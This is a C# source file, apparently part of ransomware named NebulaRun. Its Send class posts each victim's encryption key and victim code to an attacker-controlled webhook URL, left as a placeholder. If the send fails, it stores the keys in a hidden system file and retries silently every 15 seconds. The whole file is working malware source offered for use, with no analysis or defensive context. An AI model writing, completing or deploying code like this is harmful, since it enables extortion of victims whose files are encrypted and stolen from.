using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace NebulaRun
{

public static class Send
{
	private static readonly string QueueFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NebulaQueue.dat");

	public static async Task SendKeyAndIvAsync(string base64Key, string base64Iv, string victimCode)
	{
		bool sent = false;
		try
		{
			HttpClient client = new HttpClient();
			try
			{
				StringContent val = new StringContent("{\"content\": \"Victim Code: " + victimCode + "\\nKey: " + base64Key + "\"}", Encoding.UTF8, "application/json");
				HttpResponseMessage resp = await client.PostAsync("YOUR URL HERE!!!!?!?!??!?!?!?!", (HttpContent)(object)val);
				if (resp.IsSuccessStatusCode)
				{
					sent = true;
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
		}
		catch
		{
		}

		if (!sent)
		{
			SaveToQueue(base64Key, victimCode);
			StartQueueWorker();
		}
	}

	private static void SaveToQueue(string base64Key, string victimCode)
	{
		try
		{
			string data = victimCode + "|" + base64Key + "\r\n";
			File.AppendAllText(QueueFilePath, data, Encoding.UTF8);
			try
			{
				File.SetAttributes(QueueFilePath, FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static void StartQueueWorker()
	{
		Task.Run(async delegate
		{
			while (true)
			{
				await Task.Delay(15000);
				try
				{
					if (!File.Exists(QueueFilePath)) break;
					string[] lines = File.ReadAllLines(QueueFilePath, Encoding.UTF8);
					if (lines.Length == 0)
					{
						File.Delete(QueueFilePath);
						break;
					}

					List<string> remaining = new List<string>();
					HttpClient client = new HttpClient();

					foreach (string line in lines)
					{
						if (string.IsNullOrWhiteSpace(line)) continue;
						string[] parts = line.Split('|');
						if (parts.Length >= 2)
						{
							string vCode = parts[0];
							string bKey = parts[1];
							try
							{
								StringContent val = new StringContent("{\"content\": \"[Offline Queue] Victim Code: " + vCode + "\\nKey: " + bKey + "\"}", Encoding.UTF8, "application/json");
								HttpResponseMessage resp = await client.PostAsync("YOUR URL HERE !?!??!", (HttpContent)(object)val);
								if (!resp.IsSuccessStatusCode)
								{
									remaining.Add(line);
								}
							}
							catch
							{
								remaining.Add(line);
							}
						}
					}
					((IDisposable)client)?.Dispose();

					if (remaining.Count == 0)
					{
						File.Delete(QueueFilePath);
						break;
					}
					else
					{
						File.WriteAllLines(QueueFilePath, remaining.ToArray(), Encoding.UTF8);
					}
				}
				catch
				{
				}
			}
		});
	}
}

}
